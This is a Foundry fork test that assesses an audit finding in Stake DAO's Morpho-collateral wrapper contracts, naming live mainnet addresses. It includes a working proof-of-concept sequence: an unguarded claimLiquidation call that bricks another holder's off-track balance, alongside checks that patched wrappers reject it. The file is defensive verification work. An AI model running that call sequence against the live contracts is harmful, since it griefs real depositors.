// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import {IERC20, IMorpho, IRewardVault, IWrapperOld, IWrapperFixed} from "../src/Interfaces.sol";

interface IRVDeposit {
    function deposit(uint256 assets, address receiver, address referrer) external returns (uint256);
}

/// @title Stake DAO "Curator / Morpho-collateral vault" — live assessment of Pashov C-02
///        ("Checkpoints are almost always outdated due to missing `_update` override").
///
/// Fork-only, read-only against mainnet state (no transaction is ever broadcast).
///
/// Proven here:
///  1. Live state: the *value-bearing* Stake DAO Morpho markets are collateralised by PATCHED
///     StrategyWrappers (permissioned transfer + `claimLiquidation` hole-clamp + always-advance
///     reward settle). Pre-patch wrappers survive only in dust markets (~$0 collateral).
///  2. The patched wrapper rejects the missing-`liquidator`-guard redemption
///     (`claimLiquidation(LENDING_PROTOCOL, victim, amt)`), which is the exact C-02 descendant
///     path; the legitimate off-track holder path still settles correctly.
///  3. The pre-patch wrapper accepts that path, but the attacker nets ZERO: the unwrapped
///     RewardVault shares are sent to Morpho, and the caller keeps an unredeemable off-track
///     balance (griefing / DoS, not theft).
contract StakeDaoCuratorTest is Test {
    address constant MORPHO = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb;
    address constant CRV = 0xD533a949740bb3306d119CC777fa900bA034cd52;

    // Pre-patch wrapper — market `stakedao-llsreUSD`, loan USDC, no live collateral.
    address constant W_OLD = 0x76589A6707a765f499BBF33C7be4db41C1Db7f58;
    address constant RV_OLD = 0x0DB9f8572abEb2e982782D869e764C9Fa162F2Bb;
    bytes32 constant ID_OLD = 0xdde45ad7e78bba0142b84c657963d42861d5bd6e667376fcc1239df14e7b1119;

    // Pre-patch wrapper with an orphaned reward pot — market `stakedao-FrxMsUSD`.
    address constant W_POT = 0x3B855AA8CC56a3cBd5dBb5456F5A13Ce86AA0fe8;

    // Patched wrapper — market `stakedao-frxsUSDS`, loan frxUSD (~$375k collateral).
    address constant W_FIX = 0x62923a64D7940be920FD5cdc27873Ab8eEc59F9F;
    address constant RV_FIX = 0x5E1DACDBEF6bcEba53600d0BcE33FD30EE09fA82;
    bytes32 constant ID_FIX = 0x1f10c0899fdab5d90b11fd830d52c0c468ba8a7cde67deaa37bebbf512ac47ca;

    address constant A = address(0xA11CE);
    address constant B = address(0xB0B);
    address constant ALT = address(0xBADBAD);

    function setUp() public {
        vm.createSelectFork(vm.envOr("FORK_RPC_URL", vm.envOr("RPC_URL", string("https://ethereum-rpc.publicnode.com"))));
    }

    function _params(bytes32 id) internal view returns (IMorpho.MarketParams memory) {
        return IMorpho(MORPHO).idToMarketParams(id);
    }

    /// @dev Sourcing real RewardVault shares without touching anyone else's funds: deal the
    ///      vault's own underlying LP, then deposit it through the vault (mints fresh shares).
    function _getShares(address rv, address user, uint256 lpAmount) internal returns (uint256 shares) {
        address lp = IRewardVault(rv).asset();
        deal(lp, user, lpAmount);
        vm.startPrank(user);
        IERC20(lp).approve(rv, lpAmount);
        shares = IRVDeposit(rv).deposit(lpAmount, user, user);
        vm.stopPrank();
    }

    // ------------------------------------------------------------------
    // 1. Live state
    // ------------------------------------------------------------------
    function test_live_state() public view {
        uint256 morphoFix = IERC20(W_FIX).balanceOf(MORPHO);
        uint256 morphoOld = IERC20(W_OLD).balanceOf(MORPHO);

        console2.log("fork block", block.number);
        console2.log("W_FIX totalSupply", IERC20(W_FIX).totalSupply());
        console2.log("W_FIX collateral held by Morpho", morphoFix);
        console2.log("W_OLD totalSupply", IERC20(W_OLD).totalSupply());
        console2.log("W_OLD collateral held by Morpho", morphoOld);

        assertGt(morphoFix, 1e23, "patched market should hold >100k wrapper collateral");
        assertEq(morphoOld, 0, "pre-patch wrapper market has no live collateral");
    }

    // ------------------------------------------------------------------
    // 2. Pre-patch wrapper: missing `liquidator` guard executes — attacker nets ZERO
    // ------------------------------------------------------------------
    function test_old_wrapper_missing_guard_no_profit() public {
        uint256 sA = _getShares(RV_OLD, A, 1e24);
        uint256 sB = _getShares(RV_OLD, B, 1e24);
        assertGt(sA, 0);
        assertGt(sB, 0);

        IMorpho.MarketParams memory p = _params(ID_OLD);
        assertEq(p.collateralToken, W_OLD);

        vm.startPrank(A);
        IERC20(RV_OLD).approve(W_OLD, sA);
        IWrapperOld(W_OLD).depositShares(sA);
        vm.stopPrank();

        vm.startPrank(B);
        IERC20(RV_OLD).approve(W_OLD, sB);
        IWrapperOld(W_OLD).depositShares(sB);
        vm.stopPrank();

        // A pulls its own collateral out to a different receiver (ALT) directly through Morpho.
        vm.prank(A);
        IMorpho(MORPHO).withdrawCollateral(p, sA, A, ALT);
        assertEq(IERC20(W_OLD).balanceOf(ALT), sA, "ALT holds off-track wrapper tokens");
        assertEq(IERC20(W_OLD).balanceOf(MORPHO), sB, "Morpho holds B's deposit");

        // --- C-02 descendant: anyone calls claimLiquidation with liquidator = Morpho ---
        uint256 attackerRvBefore = IERC20(RV_OLD).balanceOf(address(this));
        IWrapperOld(W_OLD).claimLiquidation(MORPHO, A, sA);
        uint256 attackerRvAfter = IERC20(RV_OLD).balanceOf(address(this));

        console2.log("old wrapper: claimLiquidation(MORPHO, A, sA) executed (no guard)");
        console2.log("caller RV shares gained", attackerRvAfter - attackerRvBefore);
        console2.log("Morpho wrapper balance after", IERC20(W_OLD).balanceOf(MORPHO));
        console2.log("ALT wrapper balance after", IERC20(W_OLD).balanceOf(ALT));

        assertEq(attackerRvAfter, attackerRvBefore, "caller must gain 0 RV shares");

        // ALT's off-track tokens are now unredeemable: A's hole was consumed by the attacker.
        vm.expectRevert();
        IWrapperOld(W_OLD).claimLiquidation(ALT, A, sA);
        console2.log("ALT's off-track balance is bricked (griefing, not theft)");
    }

    // ------------------------------------------------------------------
    // 3. Patched wrapper: the same path reverts (guard); the legit path works
    // ------------------------------------------------------------------
    function test_fixed_wrapper_guard_reverts() public {
        uint256 sA = _getShares(RV_FIX, A, 1e24);
        uint256 sB = _getShares(RV_FIX, B, 1e24);

        IMorpho.MarketParams memory p = _params(ID_FIX);
        assertEq(p.collateralToken, W_FIX);

        vm.startPrank(A);
        IERC20(RV_FIX).approve(W_FIX, sA);
        IWrapperFixed(W_FIX).depositShares(sA, A);
        vm.stopPrank();

        vm.startPrank(B);
        IERC20(RV_FIX).approve(W_FIX, sB);
        IWrapperFixed(W_FIX).depositShares(sB, B);
        vm.stopPrank();

        vm.prank(A);
        IMorpho(MORPHO).withdrawCollateral(p, sA, A, ALT);
        assertEq(IERC20(W_FIX).balanceOf(ALT), sA);

        // Guard: neither Morpho nor the wrapper itself may act as liquidator.
        vm.expectRevert();
        IWrapperFixed(W_FIX).claimLiquidation(MORPHO, A, sA);
        vm.expectRevert();
        IWrapperFixed(W_FIX).claimLiquidation(W_FIX, A, sA);

        // The legitimate path (real off-track holder ALT) works and is value-fair.
        vm.prank(ALT);
        uint256 claimed = IWrapperFixed(W_FIX).claimLiquidation(ALT, A, sA);
        assertEq(claimed, sA, "legit liquidator unwraps the full seized amount");
        assertEq(IERC20(RV_FIX).balanceOf(ALT), sA, "legit liquidator receives RV shares");
        console2.log("patched wrapper: guard reverts for MORPHO/self; legit claim ok", claimed);
    }

    // ------------------------------------------------------------------
    // 4. Orphaned reward pot on the pre-patch wrapper (the settle-fix gap)
    // ------------------------------------------------------------------
    function test_orphaned_reward_pot() public view {
        uint256 potCrv = IERC20(CRV).balanceOf(W_POT);
        uint256 tsPot = IERC20(W_POT).totalSupply();
        console2.log("W_POT (old FrxMsUSD) CRV reward balance", potCrv);
        console2.log("W_POT totalSupply (wei)", tsPot);
        // Pre-patch settle only advances the checkpoint when the payout is non-zero, so the pot
        // strands at dust supply; the patched wrapper always advances it. Value ≈ $85.
        assertGt(potCrv, 0);
        assertLt(tsPot, 1e6, "dust supply -> orphaned pot");
    }
}
